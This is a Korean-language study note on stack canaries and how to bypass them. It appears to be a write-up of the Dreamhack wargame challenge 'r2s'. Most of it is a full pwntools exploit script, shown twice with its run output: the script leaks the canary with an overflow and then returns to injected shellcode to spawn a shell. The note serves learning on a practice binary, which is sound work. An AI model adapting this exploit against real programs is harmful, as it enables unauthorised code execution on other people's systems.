스택 버퍼 오버플로우를 막는것은 까나리

# **카나리**

함수 시작 시 스택 버퍼와 Return Address 사이에 랜덤 값을 삽입한 후 함수 종료 시 해당 랜덤 값의 변조 여부를 확인하여 메모리 오염 여부를 확인하는 보호 기법입니다.

# **카나리 생성**

`security_init`함수에서 TLS에 랜덤 값으로 카나리를 설정하면, 매 함수에서 이를 참조하여 사용합니다.

# **카나리 우회 기법**

- 무차별 대입 공격(Brute Force Attack):
    
    무차별 대입으로 카나리 값을 구하는 방법. 현실적으로 불가능에 가깝습니다.
    
- TLS 접근:
    
    카나리는 TLS에 전역 변수로 저장되므로, 이 값을 읽거나 조작할 수 있으면 카나리를 우회할 수 있습니다.
    
- 스택 카나리 릭:
    
    함수의 프롤로그에서 스택에 카나리 값을 저장하므로, 이를 읽어낼 수 있으면 카나리를 우회할 수 있습니다. 가장 현실적인 카나리 우회 기법입니다.
    
    fs 0x28 리눅스에서 canary 저장주소
    
    보호기법을 파악할 때 주로 사용하는 툴이 **checksec**입니다. **pwntools**를 설치할 때 같이 설치되어 `~/.local/bin/checksec`에 위치합니다. **checksec**을 사용하면 간단한 커맨드 하나로 바이너리에 적용된 보호기법들을 파악할 수 있습니다.
    
    $ checksec ./r2s
    [*] '/home/dreamhack/r2s'
    
    Arch:     amd64-64-little
    
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
    
    pwntools 스크립트
    
    #!/usr/bin/env python3
    
    # Name: [r2s.py](http://r2s.py/)
    
    from pwn import *
    
    def slog(n, m): return success(': '.join([n, hex(m)]))
    
    p = process('./r2s')
    
    context.arch = 'amd64'
    
    # [1] Get information about buf
    
    p.recvuntil(b'buf: ')
    buf = int(p.recvline()[:-1], 16)
    slog('Address of buf', buf)
    
    p.recvuntil(b'$rbp: ')
    buf2sfp = int(p.recvline().split()[0])
    buf2cnry = buf2sfp - 8
    slog('buf <=> sfp', buf2sfp)
    slog('buf <=> canary', buf2cnry)
    

```python
#!/usr/bin/env python3
# Name: r2s.py
from pwn import *

def slog(n, m): return success(': '.join([n, hex(m)]))

p = process('./r2s')

context.arch = 'amd64'

# [1] Get information about buf
p.recvuntil(b'buf: ')
buf = int(p.recvline()[:-1], 16)
slog('Address of buf', buf)

p.recvuntil(b'$rbp: ')
buf2sfp = int(p.recvline().split()[0])
buf2cnry = buf2sfp - 8
slog('buf <=> sfp', buf2sfp)
slog('buf <=> canary', buf2cnry)
```

**Stackframe**

!https://dreamhack-lecture.s3.amazonaws.com/media/8d0256dde2a27f1bbaaec142f8023719799b5e90bd4ee193f660be863bdb9e43.png

> $ python3 ./r2s.py
[+] Starting local process './r2s': pid 8564
[+] Address of buf: 0x7ffe58a8d740
[+] buf <=> sfp: 0x60
[+] buf <=> canary: 0x58
[+] Canary: 0x40e736d41cd76400
> 

# [2] Leak canary value

payload = b'A'*(buf2cnry + 1) # (+1) because of the first null-byte

p.sendafter(b'Input:', payload)
p.recvuntil(payload)
cnry = u64(b'\x00'+p.recvn(7))
slog('Canary', cnry)

|  | $ python3 ./r2s.py |
| --- | --- |
|  | [+] Starting local process './r2s': pid 8593 |
|  | [+] Address of buf: 0x7ffc323acb00 |
|  | [+] buf <=> sfp: 0x60 |
|  | [+] buf <=> canary: 0x58 |
|  | [+] Canary: 0x6955522676848000 |
|  | [*] Switching to interactive mode |
|  | $ id |
|  | uid=1000(dreamhack) gid=1000(dreamhack) groups=1000(dreamhack) ... |

# [3] Exploit

sh = asm([shellcraft.sh](http://shellcraft.sh/)())
payload = sh.ljust(buf2cnry, b'A') + p64(cnry) + b'B'*0x8 + p64(buf)

gets() receives input until '\n' is received

p.sendlineafter(b'Input:', payload)

p.interactive()

```python
#!/usr/bin/env python3
# Name: r2s.py
from pwn import *

def slog(n, m): return success(': '.join([n, hex(m)]))

p = process('./r2s')

context.arch = 'amd64'

# [1] Get information about buf
p.recvuntil(b'buf: ')
buf = int(p.recvline()[:-1], 16)
slog('Address of buf', buf)

p.recvuntil(b'$rbp: ')
buf2sfp = int(p.recvline().split()[0])
buf2cnry = buf2sfp - 8
slog('buf <=> sfp', buf2sfp)
slog('buf <=> canary', buf2cnry)

# [2] Leak canary value
payload = b'A'*(buf2cnry + 1) # (+1) because of the first null-byte

p.sendafter(b'Input:', payload)
p.recvuntil(payload)
cnry = u64(b'\x00'+p.recvn(7))
slog('Canary', cnry)

# [3] Exploit
sh = asm(shellcraft.sh())
payload = sh.ljust(buf2cnry, b'A') + p64(cnry) + b'B'*0x8 + p64(buf)
# gets() receives input until '\n' is received
p.sendlineafter(b'Input:', payload)

p.interactive()
```

정리

1. rbp - 0x8 까지 아무 값이나 넣어 buf를 출력할 때 canary 값을 같이 출력

2. 알아낸 canary 값을 토대로 payload 작성

3. payload = shellcode(0x30바이트임) + 아무 값 * 0x28 + canary + 아무 값 * 0x8 + buf의 주소

![ReturnToShellcode.jpg](https://github.com/JoWoonJi/Dreamhack_Wargame/blob/main/SystemHacking/img/ReturnToShellcode.jpg)

DH 획득
